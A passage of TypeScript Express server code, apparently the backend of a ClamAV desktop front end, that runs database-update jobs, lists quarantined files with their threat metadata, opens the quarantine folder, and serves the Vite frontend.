                if (lines.length) activeJobs[jobId].logs.push(...lines);
            });
            
            child.stderr.on("data", (data) => {
                const lines = data.toString().split('\n').map((l: string) => l.trim()).filter(Boolean);
                if (lines.length) activeJobs[jobId].logs.push(...lines);
            });
            
            child.on("close", async (code) => {
                if (!activeJobs[jobId]) return;
                activeJobs[jobId].status = "done";
                activeJobs[jobId].result = code ?? 0;
                activeJobs[jobId].process = null;
                
                await addHistory({
                    type: "update",
                    target: "Databases",
                    result: code === 0 ? 0 : 1,
                    threatsFound: 0,
                    scannedFiles: 0,
                    duration: 1, 
                    actionTaken: code === 0 ? "Updated" : "Failed"
                });
            });

            child.on("error", (err) => {
                if (!activeJobs[jobId]) return;
                activeJobs[jobId].logs.push(`Error: ${err.message}`);
                activeJobs[jobId].status = "done";
                activeJobs[jobId].result = -1;
                activeJobs[jobId].process = null;
            });
            
            res.json({ jobId, status: "started" });
        } catch(e: any) {
            res.status(500).json({ error: e.message });
        }
    });

    app.get("/api/quarantine", async (req, res) => {
        try {
            const files = await fs.readdir(settings.quarantineDir);
            const qMap = await getQuarantineMap();
            console.log("Quarantine files:", files);
            console.log("Quarantine map:", qMap);
            
            const items = await Promise.all(files.map(async file => {
                const stat = await fs.stat(path.join(settings.quarantineDir, file));
                
                // ClamAV might append '.001' or similar for dupes. We try to match basename or fallback
                // Easiest is exact match, or stripping .001 maybe. Let's just lookup exactly initially.
                let meta = qMap[file];
                // if not found, check if it ends with .xxx numbers
                if (!meta) {
                    const baseMatch = file.match(/^(.*?)(?:\.\d{3})?$/);
                    if (baseMatch && qMap[baseMatch[1]]) {
                        meta = qMap[baseMatch[1]];
                    }
                }
                
                return {
                    id: file,
                    fileName: file,
                    threatName: meta ? meta.threatName : "Unknown Threat",
                    originalPath: meta ? meta.originalPath : "Unknown",
                    size: stat.size,
                    date: stat.mtime
                };
            }));
            
            console.log("Quarantine items returned:", items);
            res.json(items);
        } catch (e: any) {
            console.error("Error reading quarantine dir:", e);
            res.status(500).json({ error: e.message, items: [] });
        }
    });

    app.get("/api/open-quarantine", async (req, res) => {
        try {
            if (process.platform === 'win32') {
                exec(`explorer "${settings.quarantineDir}"`);
            } else if (process.platform === 'darwin') {
                exec(`open "${settings.quarantineDir}"`);
            } else {
                exec(`xdg-open "${settings.quarantineDir}"`);
            }
            res.json({ success: true });
        } catch (e: any) {
            res.status(500).json({ error: e.message });
        }
    });

    // Vite Middleware for Frontend
    if (process.env.NODE_ENV !== "production") {
        const vite = await createViteServer({
            server: { middlewareMode: true },
            appType: "spa"
        });
        app.use(vite.middlewares);
    } else {
        const distPath = path.join(process.cwd(), "dist");
        app.use(express.static(distPath));
        app.get("*", (req, res) => res.sendFile(path.join(distPath, "index.html")));
    }

    const PORT = process.env.PORT || 3000;
    app.listen(Number(PORT), "0.0.0.0", () => {
        console.log(`Server running on http://0.0.0.0:${PORT} (Simulated: ${isSimulated})`);
    });
}

startServer();
